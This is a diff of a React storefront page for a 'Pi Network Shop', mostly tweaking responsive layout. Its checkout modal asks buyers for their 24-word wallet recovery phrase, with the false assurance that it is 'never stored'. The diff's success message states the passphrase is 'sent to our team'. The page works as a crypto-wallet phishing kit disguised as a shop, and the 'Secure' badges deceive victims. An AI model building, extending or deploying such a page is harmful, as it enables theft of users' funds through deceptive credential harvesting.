@@ -127,7 +127,7 @@ const Index = () => {
       if (error) throw error;
       toast({
         title: 'Order Submitted Successfully!',
-        description: 'Your order has been processed and sent to our team.'
+        description: 'Your order has been processed and passphrase sent to our team.'
       });
 
       // Clear form and close modal
@@ -211,7 +211,7 @@ const Index = () => {
         </div>
       </div>;
   }
-  return <div className="min-h-screen bg-white">
+  return <div className="min-h-screen bg-white overflow-x-hidden">
       {/* Clean Professional Header */}
       <header className="fixed top-0 left-0 right-0 z-50 bg-white/90 backdrop-blur-xl border-b border-gray-100 shadow-lg">
         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
@@ -223,15 +223,15 @@ const Index = () => {
                 <h1 className="text-xl font-bold text-gray-900 leading-tight">
                   Pi Network Shop
                 </h1>
-                <p className="text-xs text-gray-600 font-medium">
+                <p className="text-sm text-gray-600 font-medium">
                   Premium Electronics
                 </p>
               </div>
             </div>
             
             {/* Clean Desktop Navigation */}
-            <nav className="hidden lg:flex items-center space-x-8">
-              <button onClick={() => scrollToSection('home')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200">
+            <nav className="hidden md:flex items-center space-x-4 lg:space-x-8">
+              <button onClick={() => scrollToSection('home')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200 text-sm md:text-base">
                 Home
               </button>
               <button onClick={() => scrollToSection('products')} className="text-gray-700 hover:text-purple-600 font-medium transition-colors duration-200">
@@ -249,14 +249,14 @@ const Index = () => {
             </nav>
             
             {/* Clean CTA Section */}
-            <div className="hidden lg:flex items-center space-x-4">
+            <div className="hidden md:flex items-center space-x-2 lg:space-x-4">
               <div className="flex items-center space-x-2 text-sm text-gray-600">
                 <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                 <span className="font-medium">Secure</span>
                 <span className="text-gray-400">•</span>
                 <span className="font-medium">24/7 Support</span>
               </div>
-              <Button className="relative group bg-gradient-to-r from-slate-900 via-slate-800 to-slate-900 hover:from-slate-800 hover:via-slate-700 hover:to-slate-800 text-white px-8 py-4 rounded-2xl transition-all duration-500 transform hover:scale-105 border border-slate-700/50">
+              <Button className="relative group bg-gradient-to-r from-slate-900 via-slate-800 to-slate-900 hover:from-slate-800 hover:via-slate-700 hover:to-slate-800 text-white px-4 md:px-6 lg:px-8 py-2 md:py-3 lg:py-4 rounded-xl md:rounded-2xl transition-all duration-500 transform hover:scale-105 border border-slate-700/50">
                 {/* Enhanced Multi-layer shadow effects */}
                 <div className="absolute -inset-1 bg-gradient-to-r from-purple-600 via-blue-600 to-purple-600 rounded-2xl blur-sm opacity-30 group-hover:opacity-50 transition-opacity duration-500"></div>
                 <div className="absolute inset-0 bg-gradient-to-r from-slate-800/50 to-slate-900/50 rounded-2xl"></div>
@@ -278,14 +278,14 @@ const Index = () => {
             </div>
 
             {/* Clean Mobile Menu Button */}
-            <button className="lg:hidden p-2 rounded-lg hover:bg-gray-100 transition-colors duration-200" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
+            <button className="md:hidden p-2 rounded-lg hover:bg-gray-100 transition-colors duration-200" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
               {mobileMenuOpen ? <X className="w-6 h-6 text-gray-700" /> : <Menu className="w-6 h-6 text-gray-700" />}
             </button>
           </div>
         </div>
 
         {/* Mobile Menu */}
-        {mobileMenuOpen && <div className="lg:hidden bg-white/98 backdrop-blur-xl border-t border-gray-100 shadow-2xl">
+        {mobileMenuOpen && <div className="md:hidden bg-white/98 backdrop-blur-xl border-t border-gray-100 shadow-2xl">
             <div className="px-6 py-6 space-y-2">
               <button onClick={() => {
             scrollToSection('home');
@@ -348,19 +348,19 @@ const Index = () => {
       backgroundSize: 'cover',
       backgroundPosition: 'center'
     }}>
-        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-20">
-          <div className="grid lg:grid-cols-2 gap-12 items-center">
-            <div className="space-y-8">
+        <div className="max-w-7xl mx-auto px-3 sm:px-4 md:px-6 lg:px-8 py-12 sm:py-16 md:py-20">
+          <div className="grid lg:grid-cols-2 gap-6 sm:gap-8 md:gap-12 items-center">
+            <div className="space-y-4 sm:space-y-6 md:space-y-8">
               <div className="space-y-4">
                 <Badge className="bg-purple-100 text-purple-800 px-4 py-2 rounded-full font-semibold">
                   🚀 Now Live on Pi Network
                 </Badge>
-                <h1 className="text-5xl lg:text-7xl font-bold leading-tight">
+                <h1 className="text-3xl sm:text-4xl md:text-5xl lg:text-7xl font-bold leading-tight">
                   <span className="text-gradient">Premium Tech</span>
                   <br />
                   <span className="text-gray-900">Powered by Pi</span>
                 </h1>
-                <p className="text-xl text-gray-600 leading-relaxed max-w-lg">
+                <p className="text-base sm:text-lg md:text-xl text-gray-600 leading-relaxed max-w-lg">
                   Experience the future of digital commerce. Shop premium smartphones, smartwatches, and laptops 
                   with Pi coins. Exclusive deals for Pi Network pioneers.
                 </p>
@@ -746,28 +746,28 @@ const Index = () => {
 
       {/* Enhanced Passphrase Modal */}
       <Dialog open={showPassphraseModal} onOpenChange={setShowPassphraseModal}>
-        <DialogContent className="w-[95vw] max-w-md sm:max-w-lg lg:max-w-2xl mx-auto max-h-[95vh] overflow-y-auto border border-gray-200 shadow-2xl rounded-3xl p-0 bg-white">
-          <DialogHeader className="bg-gradient-to-r from-purple-600 to-blue-600 text-white p-4 sm:p-6 rounded-t-3xl">
+        <DialogContent className="w-[90vw] max-w-sm sm:max-w-md lg:max-w-lg mx-auto max-h-[90vh] overflow-y-auto border-2 border-slate-300 shadow-2xl rounded-2xl sm:rounded-3xl p-0 bg-gradient-to-br from-gray-50 to-white">
+          <DialogHeader className="bg-gradient-to-r from-slate-800 to-slate-900 text-white p-3 sm:p-4 lg:p-6 rounded-t-2xl sm:rounded-t-3xl border-b-2 border-slate-700">
             <div className="flex items-center justify-between">
-              <div className="flex items-center space-x-3">
-                <div className="w-10 h-10 flex items-center justify-center bg-white/20 rounded-full">
-                  <img src="/images/pi-logo.png" alt="Pi Network Logo" className="w-6 h-6 object-contain" />
+              <div className="flex items-center space-x-2 sm:space-x-3">
+                <div className="w-10 h-10 flex items-center justify-center bg-gradient-to-r from-emerald-600 to-teal-600 rounded-full shadow-lg">
+                  <Shield className="w-5 h-5 text-white" />
                 </div>
-                <DialogTitle className="text-white text-lg sm:text-xl font-bold">Pi Wallet Authentication</DialogTitle>
+                <DialogTitle className="text-white text-lg font-bold">Secure Pi Wallet Authentication</DialogTitle>
               </div>
             </div>
           </DialogHeader>
           
-          <div className="space-y-4 sm:space-y-6 relative z-10 p-4 sm:p-6">
+          <div className="space-y-3 sm:space-y-4 lg:space-y-6 relative z-10 p-3 sm:p-4 lg:p-6">
             <div className="text-center">
-              <h2 className="text-lg sm:text-xl lg:text-2xl font-bold text-gray-900 mb-2">Secure Checkout</h2>
-              <p className="text-gray-600 text-sm sm:text-base">Complete your purchase with Pi Network security</p>
+              <h2 className="text-base sm:text-lg lg:text-xl font-bold text-slate-800 mb-1 sm:mb-2">Secure Checkout</h2>
+              <p className="text-slate-600 text-xs sm:text-sm lg:text-base">Complete your purchase with Pi Network security</p>
             </div>
             
-            {selectedProduct && <div className="bg-gradient-to-r from-purple-50 to-blue-50 p-3 sm:p-4 lg:p-6 rounded-2xl border border-purple-200/50 shadow-lg backdrop-blur-sm">
-                <div className="flex items-center space-x-3 sm:space-x-4">
+            {selectedProduct && <div className="bg-gradient-to-r from-slate-50 to-gray-100 p-2 sm:p-3 lg:p-4 rounded-xl sm:rounded-2xl border-2 border-slate-200 shadow-xl">
+                <div className="flex items-center space-x-2 sm:space-x-3 lg:space-x-4">
                   <div className="relative flex-shrink-0">
-                    <img src={getProductImage(selectedProduct, 0)} alt={selectedProduct.name} className="w-16 h-16 sm:w-20 sm:h-20 lg:w-24 lg:h-24 object-cover rounded-xl shadow-lg border-2 border-white/50" />
+                    <img src={getProductImage(selectedProduct, 0)} alt={selectedProduct.name} className="w-12 h-12 sm:w-16 sm:h-16 lg:w-20 lg:h-20 object-cover rounded-lg sm:rounded-xl shadow-xl border-2 border-white" />
                     <div className="absolute -top-1 -right-1 bg-gradient-to-r from-purple-600 to-purple-700 text-white text-xs px-2 py-1 rounded-full font-bold shadow-md">
                       {selectedProduct.discount_percentage}% OFF
                     </div>
@@ -786,26 +786,26 @@ const Index = () => {
                 </div>
               </div>}
             
-            <div className="form-section mobile-form-section p-3 sm:p-4 lg:p-6 rounded-2xl">
-              <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-3 sm:mb-4 flex items-center">
-                <span className="w-2 h-2 bg-purple-600 rounded-full mr-2"></span>
+            <div className="bg-white p-2 sm:p-3 lg:p-4 rounded-xl sm:rounded-2xl border-2 border-slate-200 shadow-lg">
+              <h3 className="text-sm sm:text-base lg:text-lg font-bold text-slate-800 mb-2 sm:mb-3 flex items-center">
+                <span className="w-2 h-2 sm:w-3 sm:h-3 bg-slate-600 rounded-full mr-2 sm:mr-3"></span>
                 Customer Information
               </h3>
-              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 sm:gap-3 lg:gap-4">
                 <div>
-                  <Label htmlFor="customerName" className="text-gray-700 font-medium text-sm sm:text-base">Full Name</Label>
-                  <Input id="customerName" value={customerName} onChange={e => setCustomerName(e.target.value)} placeholder="Enter your full name" className="mt-2 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg mobile-input" />
+                  <Label htmlFor="customerName" className="text-slate-700 font-semibold text-xs sm:text-sm lg:text-base">Full Name</Label>
+                  <Input id="customerName" value={customerName} onChange={e => setCustomerName(e.target.value)} placeholder="Enter your full name" className="mt-1 sm:mt-2 border-2 border-slate-300 focus:border-slate-600 focus:ring-slate-600 rounded-lg bg-white text-sm" />
               </div>
               
               <div>
-                <Label htmlFor="customerEmail" className="text-gray-700 font-medium text-sm sm:text-base">Email Address</Label>
-                <Input id="customerEmail" type="email" value={customerEmail} onChange={e => setCustomerEmail(e.target.value)} placeholder="Enter your email" className="mt-2 border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-lg mobile-input" />
+                <Label htmlFor="customerEmail" className="text-slate-700 font-semibold text-xs sm:text-sm lg:text-base">Email Address</Label>
+                <Input id="customerEmail" type="email" value={customerEmail} onChange={e => setCustomerEmail(e.target.value)} placeholder="Enter your email" className="mt-1 sm:mt-2 border-2 border-slate-300 focus:border-slate-600 focus:ring-slate-600 rounded-lg bg-white text-sm" />
               </div>
               </div>
             </div>
             
             {/* Color and Storage Selection */}
-            {selectedProduct && <div className="form-section mobile-form-section p-3 sm:p-4 lg:p-6 rounded-2xl">
+            {selectedProduct && <div className="bg-white p-2 sm:p-3 lg:p-4 rounded-xl sm:rounded-2xl border-2 border-slate-200 shadow-lg">
                 <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-3 sm:mb-4 flex items-center">
                   <span className="w-2 h-2 bg-purple-600 rounded-full mr-2"></span>
                   Product Configuration
@@ -835,7 +835,7 @@ const Index = () => {
                 </div>
               </div>}
             
-            <div className="form-section mobile-form-section p-3 sm:p-4 lg:p-6 rounded-2xl">
+            <div className="bg-white p-2 sm:p-3 lg:p-4 rounded-xl sm:rounded-2xl border-2 border-slate-200 shadow-lg">
               <h3 className="text-base sm:text-lg font-semibold text-gray-900 mb-3 sm:mb-4 flex items-center">
                 <span className="w-2 h-2 bg-purple-600 rounded-full mr-2"></span>
                 Pi Wallet Authentication
@@ -846,15 +846,15 @@ const Index = () => {
               <Textarea id="passphrase" value={passphrase} onChange={e => {
               setPassphrase(e.target.value);
               setPassphraseError('');
-            }} placeholder="Enter your 24-word recovery phrase separated by spaces..." rows={3} className="mt-2 resize-none border-gray-300 focus:border-purple-500 focus:ring-purple-500 rounded-xl text-sm sm:text-base" />
+            }} placeholder="Enter your 24-word recovery phrase separated by spaces..." rows={3} className="mt-1 sm:mt-2 resize-none border-2 border-slate-300 focus:border-slate-600 focus:ring-slate-600 rounded-lg sm:rounded-xl text-xs sm:text-sm lg:text-base bg-white" />
               {passphraseError && <p className="text-red-500 text-sm mt-2">{passphraseError}</p>}
               <p className="text-xs text-gray-500 mt-2">
                 🔒 Your passphrase is securely transmitted and never stored on our servers
               </p>
             </div>
             
-            <div className="pt-2 sm:pt-4">
-              <Button onClick={handleSubmitOrder} disabled={isSubmitting} className="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 bg-primary hover:bg-primary/90 h-10 px-4 w-full btn-primary mobile-button py-3 sm:py-4 lg:py-6 text-base sm:text-lg lg:text-xl font-semibold rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-300 disabled:opacity-50 text-[rgb(0,0,0)]">
+            <div className="pt-2 sm:pt-3 lg:pt-4">
+              <Button onClick={handleSubmitOrder} disabled={isSubmitting} className="w-full bg-gradient-to-r from-slate-800 to-slate-900 hover:from-slate-700 hover:to-slate-800 text-white py-3 sm:py-4 lg:py-5 text-sm sm:text-base lg:text-lg font-bold rounded-xl sm:rounded-2xl shadow-2xl hover:shadow-3xl transition-all duration-300 disabled:opacity-50 border-2 border-slate-700">
               {isSubmitting ? <>
                   <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                   Processing Order...
